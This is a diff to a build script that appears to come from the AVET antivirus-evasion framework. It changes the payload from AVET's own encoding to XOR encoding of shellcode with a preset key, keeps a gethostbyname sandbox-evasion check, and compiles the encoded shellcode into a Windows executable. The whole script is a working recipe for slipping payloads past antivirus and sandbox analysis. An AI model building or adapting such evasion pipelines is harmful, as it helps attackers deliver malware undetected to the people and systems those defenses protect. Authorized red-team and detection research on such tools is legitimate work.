@@ -29,23 +29,27 @@ add_evasion gethostbyname_sandbox_evasion
 printf "\n#define HOSTVALUE \"this.that\"" >> source/evasion/evasion.include
 #add_evasion hide_console
 
+# generate key file
+generate_key preset aabbcc12de input/keyraw.txt
+
 # encode shellcode
-# length of generated key is 4 bytes
-encode_shellcode avet input/sc.txt input/scenc.txt
-# convert generated key from raw to C
+encode_shellcode xor input/sc.txt input/scenc.txt input/keyraw.txt
+
 # array name buf is expected by static_from_file retrieval method
 ./tools/data_raw_to_c/data_raw_to_c input/scenc.txt input/scenc_c.txt buf
 
 # set shellcode source
-# convert from raw to C format using the built-in tool
-#./tools/data_raw_to_c/data_raw_to_c input/scenc.txt input/sc.txt buf
+#./tools/data_raw_to_c/data_raw_to_c input/scenc.txt input/sc.txt "buf"
 set_shellcode_source static_from_file input/scenc_c.txt
 
+# convert generated key from raw to C into array "key"
+./tools/data_raw_to_c/data_raw_to_c input/keyraw.txt input/key.txt key
+
 # set key source
-set_key_source none
+set_key_source static_from_file input/key.txt
 
 # set decoder
-set_decoder avet
+set_decoder xor
 
 # set shellcode binding technique
 set_shellcode_binding exec_shellcode
@@ -57,6 +61,4 @@ enable_debug_print
 $win32_compiler -o output/output.exe source/avet.c -lws2_32
 
 # cleanup
-#rm output/thepayload.bin
-#rm output/pwn.exe
 cleanup_techniques
